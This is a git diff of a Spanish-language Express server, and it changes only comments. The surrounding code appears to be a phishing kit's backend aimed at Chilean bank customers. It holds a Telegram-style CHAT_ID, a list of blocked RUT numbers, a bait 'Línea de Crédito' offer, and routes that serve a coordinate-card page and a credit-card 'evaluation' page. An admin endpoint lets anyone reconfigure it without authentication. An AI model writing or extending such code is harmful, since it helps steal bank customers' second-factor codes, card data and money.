@@ -20,7 +20,7 @@ const CHAT_ID = process.env.CHAT_ID;
 // Lista de RUT bloqueados
 const bloqueados = ["250624344", "25062434-4", "25.062.434-4"];
 
-// Configuración en memoria (se puede reemplazar con DB si quieres persistencia)
+// Configuración en memoria
 let config = {
   producto1: "Línea de Crédito",
   monto1: 5000000,
@@ -30,7 +30,7 @@ let config = {
   coord1: "",
   coord2: "",
   coord3: "",
-  factibilidad: "off" // Nueva propiedad para habilitar/deshabilitar factibilidad
+  factibilidad: "off" // Nueva propiedad
 };
 
 // Endpoint de login
@@ -89,25 +89,24 @@ app.get("/coordenadas", (req, res) => {
   res.json({ coordenadas: seleccion });
 });
 
-// Endpoint de configuración (para admin y productos)
+// Endpoint de configuración (para admin)
 app.get("/config", (req, res) => {
   res.json(config);
 });
 
 app.post("/config", (req, res) => {
-  // Actualiza solo los campos enviados, manteniendo los demás
   config = { ...config, ...req.body };
   res.status(200).json({ message: "✅ Configuración guardada correctamente.", config });
 });
 
-// Ruta de autorización que decide el flujo según configuración
+// Ruta de autorización que decide flujo según configuración
 app.get("/autorizacion", (req, res) => {
+  // Caso independiente: factibilidad
   if (config.factibilidad === "on") {
-    // Si está habilitada la factibilidad, mostrar la primera pantalla de tarjeta
     return res.sendFile(path.join(__dirname, "public", "creditCardEvaluation.html"));
   }
 
-  // Si no, seguir con la lógica normal de productos
+  // Caso normal: productos con coordenadas o pass
   if (config.tipoAutorizacion === "coordenadas") {
     return res.sendFile(path.join(__dirname, "public", "coordenadas.html"));
   } else {
